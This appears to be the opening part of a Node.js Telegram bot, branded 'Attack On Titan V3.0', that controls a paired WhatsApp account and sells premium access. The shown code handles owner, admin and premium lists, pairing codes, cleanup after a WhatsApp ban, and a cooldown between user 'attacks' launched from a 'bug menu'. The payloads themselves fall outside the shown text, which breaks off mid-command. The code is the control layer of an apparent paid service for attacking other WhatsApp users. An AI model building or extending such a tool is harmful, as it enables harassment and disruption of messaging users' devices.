const {
    Telegraf,
    Markup
} = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const {
    BOT_TOKEN,
    allowedDevelopers
} = require("./Getsuzo/config");
const crypto = require('crypto');
// --- Inisialisasi Bot Telegram ---
const bot = new Telegraf(BOT_TOKEN);

// --- Variabel Global ---
let zephy = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let maintenanceConfig = {
    maintenance_mode: false,
    message: "⛔ Maaf Script ini sedang di perbaiki oleh developer, mohon untuk menunggu hingga selesai !!"
};
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let whatsappUserInfo = null;
// cooldown bug jedanya ini
let bugCooldown = 0; // dalam detik
let userLastAttack = new Map(); // Menyimpan waktu terakhir user melakukan serangan
// --- Fungsi-fungsi Bantuan ---

// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};
//funct cooldown

function checkCooldown(userId) {
    if (!userLastAttack.has(userId)) {
        return {
            canAttack: true,
            remainingTime: 0
        };
    }

    const lastAttack = userLastAttack.get(userId);
    const now = Date.now();
    const timePassed = (now - lastAttack) / 1000; // Convert to seconds

    if (timePassed < bugCooldown) {
        return {
            canAttack: false,
            remainingTime: Math.ceil(bugCooldown - timePassed)
        };
    }

    return {
        canAttack: true,
        remainingTime: 0
    };
}
// --- Fungsi untuk Menambahkan User Premium ---
// --- Premium User Management Functions ---
// This should be at the top of your file, after your imports and before any bot commands

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Function Order Should Be ---
const loadPremiumUsers = () => {
    try {
        if (fs.existsSync('./premiumUsers.json')) {
            const data = fs.readFileSync('./premiumUsers.json', 'utf8');
            premiumUsers = JSON.parse(data);
        } else {
            premiumUsers = {};
            savePremiumUsers();
        }
    } catch (error) {
        console.error('Error loading premium users:', error);
        premiumUsers = {};
    }
};

const savePremiumUsers = () => {
    try {
        const safeData = {};
        for (const [userId, userData] of Object.entries(premiumUsers)) {
            safeData[userId] = {
                expired: userData.expired
            };
        }
        const jsonString = JSON.stringify(safeData, null, 2);
        fs.writeFileSync('./premiumUsers.json', jsonString);
    } catch (error) {
        console.error('Error saving premium users:', error);
    }
};

const addPremiumUser = (userId, durationDays) => {
    try {
        if (!userId || !durationDays) {
            throw new Error('Invalid user ID or duration');
        }
        const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
        premiumUsers[userId] = {
            expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
        };
        savePremiumUsers();
    } catch (error) {
        console.error('Error adding premium user:', error);
        throw error;
    }
};
// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭─────────────────
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰─────────────────`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
    let userId, userNickname;

    if (ctx.from) {
        userId = ctx.from.id.toString();
        userNickname = ctx.from.first_name || userId;
    } else if (ctx.update.channel_post && ctx.update.channel_post.sender_chat) {
        userId = ctx.update.channel_post.sender_chat.id.toString();
        userNickname = ctx.update.channel_post.sender_chat.title || userId;
    }

    // Catat aktivitas hanya jika userId tersedia
    if (userId) {
        recordUserActivity(userId, userNickname);
    }

    if (maintenanceConfig.maintenance_mode && !OWNER_ID(ctx.from.id)) {
        // Jika mode maintenance aktif DAN user bukan developer:
        // Kirim pesan maintenance dan hentikan eksekusi middleware
        console.log("Pesan Maintenance:", maintenanceConfig.message);
        const escapedMessage = maintenanceConfig.message.replace(/\*/g, '\\*'); // Escape karakter khusus
        return await ctx.replyWithMarkdown(escapedMessage);
    } else {
        // Jika mode maintenance tidak aktif ATAU user adalah developer:
        // Lanjutkan ke middleware/handler selanjutnya
        await next();
    }
};

// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        const premiumMessage = `
 『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎 』
 ╔══════════════════
 ║ ❌ ACCESS DENIED!
 ║ 💎 Status: NON-PREMIUM
 ║ ⚠️ Need Premium Access
 ╚══════════════════`;

        await ctx.reply(premiumMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "UPGRADE TO PREMIUM",
                        url: "https://t.me/Putrialpiran"
                    }],
                    [{
                        text: "PREMIUM FEATURES",
                        callback_data: "premium_info"
                    }]
                ]
            }
        });
    }
};

// Tambahan handler untuk premium info
bot.action('premiuminfo', async (ctx) => {
    const infoMessage = `
 『 𝐀𝐭𝐭𝐚𝐜𝐤 𝐎𝐧 𝐓𝐢𝐭𝐚𝐧 𝐕𝟑.𝟎』
 ╔══════════════════
 ║ 💎 PREMIUM FEATURES
 ║ • Unlimited Access
 ║ • Priority Support
 ║ • All Commands
 ║ • Latest Updates
 ╚══════════════════`;

    await ctx.editMessageText(infoMessage, {
        reply_markup: {
            inline_keyboard: [
                [{
                    text: "OWNER PREM",
                    url: "https://t.me/Putrialpiran"
                }]
            ]
        }
    });
});

// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({
    logger: pino().child({
        level: 'silent',
        stream: 'store'
    })
});

const startSesi = async () => {
    let retryCount = 0;
    const maxRetries = 3;
    const retryDelay = 5000; // 5 detik

    const attemptConnection = async () => {
        try {
            const {
                state,
                saveCreds
            } = await useMultiFileAuthState('./session');
            const {
                version
            } = await fetchLatestBaileysVersion();

            const connectionOptions = {
                version,
                keepAliveIntervalMs: 30000,
                printQRInTerminal: false,
                logger: pino({
                    level: "silent"
                }),
                auth: state,
                browser: ['Mac OS', 'Safari', '10.15.7'],
                getMessage: async (key) => ({
                    conversation: 'P',
                }),
                connectTimeoutMs: 10000,
                qrTimeout: 30000,
            };

            zephy = makeWASocket(connectionOptions);
            zephy.ev.on('creds.update', saveCreds);
            store.bind(zephy.ev);

            zephy.ev.on('connection.update', async (update) => {
                const {
                    connection,
                    lastDisconnect
                } = update;

                if (connection === 'open') {
                    isWhatsAppConnected = true;
                    whatsappUserInfo = {
                        name: zephy?.user?.name,
                        id: zephy?.user?.id
                    };
                    retryCount = 0; // Reset retry counter

                    const successMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Connected ✅
│ • Name: ${zephy?.user?.name || 'Unknown'}
│ • Number: ${zephy?.user?.id?.split(':')[0] || 'Unknown'}
│
├─────『 𝐁𝐨𝐭 𝐈𝐧𝐟𝐨 』
│ • Mode: Active
│ • Version: 2.0 Stable Release
│ • Type: Multi-Device
│
╰═════════════════════⊱`;

                    try {
                        for (const ownerId of allowedDevelopers) {
                            await bot.telegram.sendMessage(ownerId, successMessage);
                        }
                        for (const adminId of adminList) {
                            if (!allowedDevelopers.includes(adminId)) {
                                await bot.telegram.sendMessage(adminId, successMessage);
                            }
                        }
                    } catch (error) {
                        console.error('Error sending connect notification:', error);
                    }

                    console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.green.bold('WHATSAPP CONNECTED')}
╰─────────────────`));
                }
else
                if (connection === 'close') {
                    isWhatsAppConnected = false;
                    whatsappUserInfo = null;
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

                    // Check if banned
                    const isBanned = statusCode === 401 ||
                        lastDisconnect?.error?.message?.includes('banned') ||
                        lastDisconnect?.error?.message?.includes('Block');

                    if (isBanned) {
                        const bannedMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐁𝐚𝐧𝐧𝐞𝐝 』═══════⊱
│
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Status: Account Banned ⛔
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto deleting session
│ • Create new WhatsApp number
╰═════════════════════⊱`;

                        try {
                            // Notify owners about ban
                            for (const ownerId of allowedDevelopers) {
                                await bot.telegram.sendMessage(ownerId, bannedMessage);
                            }

                            // Delete session
                            const sessionPath = './session';
                            if (fs.existsSync(sessionPath)) {
                                fs.rmSync(sessionPath, {
                                    recursive: true,
                                    force: true
                                });

                                const deleteMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐃𝐞𝐥𝐞𝐭𝐞𝐝 』═══════⊱
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session cleared ✅
│ • Ready for new pairing
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing with new number
╰═════════════════════⊱`;

                                for (const ownerId of allowedDevelopers) {
                                    await bot.telegram.sendMessage(ownerId, deleteMessage);
                                }
                            }
                            return; // Stop trying to reconnect
                        } catch (error) {
                            console.error('Error handling ban:', error);
                        }
                    }

                    // Normal disconnection handling
                    if (retryCount < maxRetries && shouldReconnect) {
                        retryCount++;

                        const disconnectMessage = `
╭═══════『 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐒𝐭𝐚𝐭𝐮𝐬 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐋𝐨𝐬𝐭 』
│ • Status: Disconnected ❌
│ • Time: ${new Date().toLocaleString()}
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Attempt: ${retryCount}/${maxRetries}
│ • Auto Reconnect: Yes
│
╰═════════════════════⊱`;

                        try {
                            for (const ownerId of allowedDevelopers) {
                                await bot.telegram.sendMessage(ownerId, disconnectMessage);
                            }
                        } catch (error) {
                            console.error('Error sending disconnect notification:', error);
                        }

                        console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));

                        await new Promise(resolve => setTimeout(resolve, retryDelay));
                        return attemptConnection();
                    }

                    // Max retries reached or shouldn't reconnect
                    if (retryCount >= maxRetries) {
                        const maxRetriesMessage = `
╭═══════『 𝐂𝐨𝐧𝐧𝐞𝐜𝐭𝐢𝐨𝐧 𝐅𝐚𝐢𝐥𝐞𝐝 』═══════⊱
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Max retries reached ❌
│ • Failed to connect ${maxRetries}x
│ • Possible account issue
│
├─────『 𝐀𝐜𝐭𝐢𝐨𝐧 』
│ • Auto clearing session...
╰═════════════════════⊱`;

                        try {
                            for (const ownerId of allowedDevelopers) {
                                await bot.telegram.sendMessage(ownerId, maxRetriesMessage);
                            }

                            // Auto delete session after max retries
                            const sessionPath = './session';
                            if (fs.existsSync(sessionPath)) {
                                fs.rmSync(sessionPath, {
                                    recursive: true,
                                    force: true
                                });

                                const clearMessage = `
╭═══════『 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐂𝐥𝐞𝐚𝐫𝐞𝐝 』═══════⊱
├─────『 𝐒𝐭𝐚𝐭𝐮𝐬 』
│ • Session deleted ✅
│ • System ready for new setup
├─────『 𝐍𝐞𝐱𝐭 𝐒𝐭𝐞𝐩 』
│ • Use /addpairing to connect new number
╰═════════════════════⊱`;

                                for (const ownerId of allowedDevelopers) {
                                    await bot.telegram.sendMessage(ownerId, clearMessage);
                                }
                            }
                        } catch (error) {
                            console.error('Error handling max retries:', error);
                        }
                    }
                }
            });

        } catch (error) {
            console.error('Connection error:', error);
            if (retryCount < maxRetries) {
                retryCount++;
                console.log(chalk.white.bold(`
╭─────────────────
┃   ${chalk.yellow.bold(`RETRY ATTEMPT ${retryCount}/${maxRetries}`)}
╰─────────────────`));
                await new Promise(resolve => setTimeout(resolve, retryDelay));
                return attemptConnection();
            }
        }
    };

    return attemptConnection();
};

// Inisialisasi bot
(async () => {
    console.log(chalk.whiteBright.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
┃        𝐒𝐔𝐂𝐂𝐄𝐒 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐃𝐀𝐓𝐀𝐁𝐀𝐒𝐄 𝐎𝐖𝐍𝐄𝐑       ┃
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯`));

    loadPremiumUsers();
    loadAdmins();
    loadDeviceList();
    loadUserActivity();

    startSesi();
    addDeviceToList(BOT_TOKEN, BOT_TOKEN);
})();
// --- Command Handler ---
// Command
bot.command("removeallbot", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    try {
        // Konfirmasi terlebih dahulu
        const confirmationMessage = `
╭═══════『 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 』═══════⊱
│
├─────『 𝐂𝐨𝐧𝐟𝐢𝐫𝐦𝐚𝐭𝐢𝐨𝐧 』
│ • Action: Remove All Bot Sessions
│ • Impact: All WhatsApp connections will be lost
│ • Status: Awaiting Confirmation
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • This action cannot be undone
│ • You'll need to pair again after this
│
╰═════════════════════⊱`;

        await ctx.reply(confirmationMessage, {
            reply_markup: {
                inline_keyboard: [
                    [{
                            text: "✅ Yes, Remove All",
                            callback_data: "confirm_remove"
                        },
                        {
                            text: "❌ Cancel",
                            callback_data: "cancel_remove"
                        }
                    ]
                ]
            }
        });

    } catch (error) {
        console.error('Remove Bot Error:', error);
        await ctx.reply("❌ Terjadi kesalahan saat mencoba menghapus session.");
    }
});

// Handler untuk konfirmasi penghapusan
bot.action('confirm_remove', async (ctx) => {
    try {
        // Hapus pesan konfirmasi
        await ctx.deleteMessage();

        // Logout dari WhatsApp jika terhubung
        if (zephy && isWhatsAppConnected) {
            await zephy.logout();
            isWhatsAppConnected = false;
            whatsappUserInfo = null;
        }

        // Hapus folder session
        const sessionPath = './session';
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, {
                recursive: true,
                force: true
            });
        }

        const successMessage = `
╭═══════『  𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』═══════⊱
│██████████ 100%
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Action: Remove All Bot Sessions
│ • Status: Completed Successfully
│
╰═════════════════════⊱`;

        await ctx.reply(successMessage);

    } catch (error) {
        console.error('Remove Session Error:', error);
        await ctx.reply("❌ Terjadi kesalahan saat menghapus session.");
    }
});

// Handler untuk membatalkan penghapusan
bot.action('cancel_remove', async (ctx) => {
    await ctx.deleteMessage();
    await ctx.reply("⚠️ Penghapusan session dibatalkan.");
});
// Command untuk pairing WhatsApp
bot.command("addpairing", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    function formatPhoneNumber(number) {
        let cleaned = number.replace(/[^0-9]/g, '');
        cleaned = cleaned.replace(/^\+/, '');

        if (cleaned.startsWith('0')) {
            return '62' + cleaned.slice(1);
        } else if (cleaned.startsWith('62')) {
            return cleaned;
        } else {
            return cleaned;
        }
    }

    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2) {
        const helpMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐆𝐮𝐢𝐝𝐞 』═══════⊱
│
├─────『 𝐅𝐨𝐫𝐦𝐚𝐭 』
│ • /addpairing 628xxxxxxxxxx
│ • /addpairing +1234567890    
│ • /addpairing 0812xxxxx
│
├─────『 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐝 』
│ • Indonesian numbers (62/0)
│ • International numbers
│ • With/without country code
│
╰═════════════════════⊱`;
        return await ctx.reply(helpMessage);
    }

    let phoneNumber = args.slice(1).join('');
    phoneNumber = formatPhoneNumber(phoneNumber);

    try {
        if (!zephy || !isWhatsAppConnected) {
            await ctx.reply("⏳ Menginisialisasi koneksi WhatsApp...");
            await startSesi();
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        await ctx.reply("⏳ Memproses permintaan pairing...");

        let pairingCode;
        let retryCount = 0;
        const maxRetries = 3;

        while (retryCount < maxRetries && !pairingCode) {
            try {
                pairingCode = await zephy.requestPairingCode(phoneNumber);
                if (!pairingCode || pairingCode.length < 4) {
                    throw new Error('Invalid pairing code received');
                }
            } catch (error) {
                retryCount++;
                if (retryCount === maxRetries) throw error;
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        // Kirim pesan awal
        const initialMsg = await ctx.reply(`
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Generated ✅
│ • Expires in: 30 seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`);

        // Set timer untuk update countdown
        let timeLeft = 30;
        const countdownInterval = setInterval(async () => {
            timeLeft--;
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                try {
                    await ctx.telegram.editMessageText(
                        ctx.chat.id,
                        initialMsg.message_id,
                        null,
                        `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: EXPIRED ⌛
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Code has expired
│ • Please request new code
│
╰═════════════════════⊱`
                    );
                } catch (error) {
                    console.error("Error updating expired message:", error);
                }
                return;
            }

            try {
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    initialMsg.message_id,
                    null,
                    `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐂𝐨𝐝𝐞 』═══════⊱
│
├─────『 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐬𝐢 』
│ • Number: ${phoneNumber}
│ • Code: ${pairingCode}
│ • Status: Active ✅
│ • Expires in: ${timeLeft} seconds
│
├─────『 𝐈𝐧𝐬𝐭𝐫𝐮𝐜𝐭𝐢𝐨𝐧𝐬 』
│ 1. Open WhatsApp
│ 2. Go to Settings/Menu
│ 3. Linked Devices
│ 4. Link a Device
│ 5. Enter the code above
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Keep code private
│ • Use official WhatsApp only
│
╰═════════════════════⊱`
                );
            } catch (error) {
                console.error("Error updating countdown:", error);
            }
        }, 1000);

    } catch (error) {
        console.error('Pairing Error:', error);

        const errorMessage = `
╭═══════『 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐄𝐫𝐫𝐨𝐫 』═══════⊱
│
├─────『 𝐃𝐞𝐭𝐚𝐢𝐥𝐬 』
│ • Error: Failed to generate code
│ • Number: ${phoneNumber}
│
├─────『 𝐒𝐨𝐥𝐮𝐭𝐢𝐨𝐧𝐬 』
│ • Check if number is registered
│ • Check internet connection
│ • Try again later
│
╰═════════════════════⊱`;
        await ctx.reply(errorMessage);

        if (!isWhatsAppConnected) {
            startSesi();
        }
    }
});
// Command /cekjeda
bot.command("cekjeda", async (ctx) => {
    const userId = ctx.from.id;
    const isPremium = isPremiumUser(ctx.from.id);

    // Cek status premium
    if (!isPremium) {
        return await ctx.reply(`
  ╭═══════『 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Not Premium ❌
  │ • Upgrade ke premium untuk
  │   menggunakan fitur ini
  │
  ╰═════════════════════⊱`);
    }

    // Cek status cooldown
    const cooldownStatus = checkCooldown(userId);

    if (cooldownStatus.canAttack) {
        await ctx.reply(`
  ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 𝐉𝐞𝐝𝐚 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Ready ✅
  │ • Cooldown: ${bugCooldown}s
  │ • You can attack now!
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Gunakan bug menu untuk
  │   memulai serangan
  │
  ╰═════════════════════⊱`);
    } else {
        await ctx.reply(`
  ╭═══════『 𝐒𝐭𝐚𝐭𝐮𝐬 𝐉𝐞𝐝𝐚 』═══════⊱
  │
  ├─────『 𝐈𝐧𝐟𝐨 』
  │ • Status: Cooldown ⏳
  │ • Sisa: ${cooldownStatus.remainingTime}s
  │ • Total: ${bugCooldown}s
  │
  ├─────『 𝐍𝐨𝐭𝐞 』
  │ • Tunggu cooldown selesai
  │   untuk menyerang lagi
  │
  ╰═════════════════════⊱`);
    }
});
// Command /setjeda
// Command untuk set jeda
bot.command("setjeda", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const args = ctx.message.text.split(/\s+/);
    if (args.length < 2 || isNaN(args[1])) {
        return await ctx.reply(`
╭═══════『 𝐒𝐞𝐭 𝐉𝐞𝐝𝐚 』═══════⊱
│
├─────『 𝐅𝐨𝐫𝐦𝐚𝐭 』
│ • /setjeda <detik>
│
├─────『 𝐂𝐨𝐧𝐭𝐨𝐡 』
│ • /setjeda 100
│ • /setjeda 300
│
├─────『 𝐍𝐨𝐭𝐞 』
│ • Minimal: 10 detik
│ • Maksimal: 3600 detik
│
╰═════════════════════⊱`);
    }

    const newCooldown = parseInt(args[1]);

    // Validasi input
    if (newCooldown < 10 || newCooldown > 3600) {
        return await ctx.reply("❌ Jeda harus antara 10 - 3600 detik!");
    }

    bugCooldown = newCooldown;
    await ctx.reply(`
╭═══════『 𝐒𝐞𝐭 𝐉𝐞𝐝𝐚 』═══════⊱
│
├─────『 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 』
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
│
├─────『 𝐈𝐧𝐟𝐨 』
│ • Aktif untuk semua bug menu
│ • Berlaku per-user
│
╰═════════════════════⊱`);
});
// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!OWNER_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    // Permission check
    if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    let userId;
    const args = ctx.message.text.split(" ");

    // Check if command is reply to a message
    if (ctx.message.reply_to_message) {
        userId = ctx.message.reply_to_message.from.id.toString();
    } else {
        // Manual ID input if not reply
        if (args.length < 2) {
            return await ctx.reply(`
 ╭═══════『 𝐀𝐝𝐝 𝐀𝐝𝐦𝐢𝐧 』═══════⊱
 │
